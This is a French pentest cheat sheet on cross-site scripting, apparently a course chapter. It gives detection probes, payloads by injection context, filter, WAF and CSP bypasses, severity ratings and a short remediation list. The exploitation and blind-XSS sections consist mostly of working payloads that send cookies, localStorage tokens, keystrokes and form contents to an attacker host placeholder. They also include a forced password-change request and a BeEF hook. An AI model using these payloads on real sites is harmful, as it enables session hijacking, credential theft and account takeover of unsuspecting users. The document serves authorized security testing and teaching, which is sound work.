# 19 — Cross-Site Scripting (XSS)

## Objectifs
Identifier et exploiter XSS réfléchi, stocké et DOM ; voler des sessions, exécuter des actions, contourner les filtres et CSP.

---

## 1. Détection

```html
<!-- Sondes de base -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

### Contexte d'injection
| Contexte | Payload |
|---|---|
| HTML | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` |
| Attribut (double quote) | `"><script>alert(1)</script>` |
| Attribut (simple quote) | `'><script>alert(1)</script>` |
| `href` / `src` | `javascript:alert(1)` |
| JS string | `';alert(1)//`, `\';alert(1)//` |
| Template JS | `${alert(1)}` |
| CSS | `</style><script>alert(1)</script>` |

```bash
# Test automatisé
ffuf -u "http://<TARGET>/search?q=FUZZ" -w xss_payloads.txt -mr "<script>alert\(1\)</script>"
# ou
dalfox url "http://<TARGET>/search?q=test"
xsstrike -u "http://<TARGET>/search?q=test"
```

---

## 2. Types

### Réfléchi
L'entrée est renvoyée immédiatement dans la réponse.
```
http://<TARGET>/search?q=<script>alert(document.cookie)</script>
```

### Stocké
L'entrée est persistée (commentaire, profil, ticket) puis servie aux autres utilisateurs → **impact maximal**.

### DOM-based
La source (URL, hash, localStorage) est consommée par un sink (`innerHTML`, `eval`, `document.write`).
```html
http://<TARGET>/#<img src=x onerror=alert(1)>
```
```javascript
// Sinks dangereux
innerHTML, outerHTML, document.write, eval, setTimeout(string), location
```

---

## 3. Exploitation

### Vol de cookie
```html
<script>new Image().src="http://<LHOST>:8000/?c="+document.cookie;</script>
<script>fetch('http://<LHOST>:8000/?c='+btoa(document.cookie))</script>
```

```bash
# Listener
python3 -m http.server 8000
nc -lvnp 8000
```

### Vol de token / localStorage
```html
<script>fetch('http://<LHOST>:8000/?t='+localStorage.getItem('token'))</script>
```

### Keylogger
```html
<script>
document.onkeypress=function(e){fetch('http://<LHOST>:8000/?k='+e.key)};
</script>
```

### CSRF via XSS
```html
<script>
fetch('http://<TARGET>/admin/change_password',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'password=NewPass123'});
</script>
```

### Exfiltration de formulaire
```html
<script>
document.querySelector('form').addEventListener('submit',e=>{
  fetch('http://<LHOST>:8000/?d='+btoa(new FormData(e.target).toString()))});
</script>
```

### BeEF (lab)
```bash
beef-xss
# Hook : <script src="http://<LHOST>:3000/hook.js"></script>
```

---

## 4. Contournement de filtres

### Balises bloquées
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
```

### `alert` filtré
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>window['ale'+'rt'](1)</script>
<img src=x onerror="window.top.alert(1)">
```

### Encodages
```html
<script>alert(1)</script>
<script>&#97;lert(1)</script>
<img src=x onerror="&#x61;lert(1)">
<svg onload="eval('\x61lert(1)')">
```

### Parenthèses / espaces bloqués
```html
<script>alert`1`</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### WAF
- Double encodage URL : `%253Cscript%253E`
- Unicode : `\u003cscript\u003e`
- Casse mixte : `<ScRiPt>`
- Commentaires : `<scr<!-- -->ipt>`

---

## 5. CSP

```bash
# Vérifier la politique
curl -sI https://<TARGET> | grep -i content-security-policy
```

Bypass possibles :
- `unsafe-inline` / `unsafe-eval` présents
- Domaine autorisé avec JSONP ou upload
- `script-src 'self'` + upload de fichier JS
- `base-uri` non défini → injection de `<base>`
- `nonce` réutilisé / prédictible

```html
<base href="http://<LHOST>/">
<script src="/legit.js"></script>
```

---

## 6. Blind XSS

Payload qui se déclenche dans l'interface admin :
```html
<script src="http://<LHOST>:8000/x.js"></script>
```
```javascript
// x.js
new Image().src="http://<LHOST>:8000/hit?u="+encodeURIComponent(location.href)
  +"&c="+encodeURIComponent(document.cookie);
```

Outils : XSS Hunter, `dalfox --blind`, Burp Collaborator.

---

## 7. Impact & rapport

| Type | Sévérité typique |
|---|---|
| Stocké, admin | High / Critical |
| Réfléchi authentifié | Medium |
| DOM sans impact session | Low / Medium |
| Blind avec exécution admin | High |

Preuves : payload, URL, capture du cookie reçu, description du scénario d'attaque.

### Remédiation
- Encodage contextuel en sortie (HTML, attribut, JS, URL)
- Validation en entrée (liste blanche)
- `HttpOnly`, `Secure`, `SameSite`
- CSP stricte avec nonces
- Frameworks à échappement automatique

---

## Checklist
- [ ] Tous les points d'entrée testés (GET, POST, headers, fragments)
- [ ] Contexte d'injection identifié
- [ ] Type (réfléchi/stocké/DOM) déterminé
- [ ] Filtres contournés
- [ ] Preuve d'exécution (cookie, capture)
- [ ] CSP analysée
- [ ] Remédiation proposée
